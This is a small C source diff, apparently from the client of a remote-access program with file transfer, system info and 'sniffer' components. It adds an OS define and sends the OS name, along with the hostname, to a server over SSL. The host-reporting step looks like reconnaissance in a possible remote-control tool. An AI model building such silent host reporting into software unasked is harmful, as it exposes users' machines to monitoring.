@@ -13,6 +13,7 @@
     #include "Windows/systeminfo.h"
     #include "Windows/send_receive.h"
     #include "Windows/file_transfer.h"
+    #define OS "Windows"
     #else
     #include "Linux/file_transfer.h"
     #include "Linux/send_receive.h"
@@ -21,6 +22,7 @@
     #include <unistd.h>
     #include "Linux/socket.h"
     #include "Linux/systeminfo.h"
+    #define OS "Linux"
 #endif
 
 #include "Generic/string_manipulation.h"
@@ -38,6 +40,7 @@ int main() {
         authentication();
         char* hostname = get_hostname();
         send_data(ssl, hostname);
+        send_data(ssl, OS);
         free(hostname);
         char* sniffer_dummy = receive_data(ssl);
         free(sniffer_dummy);
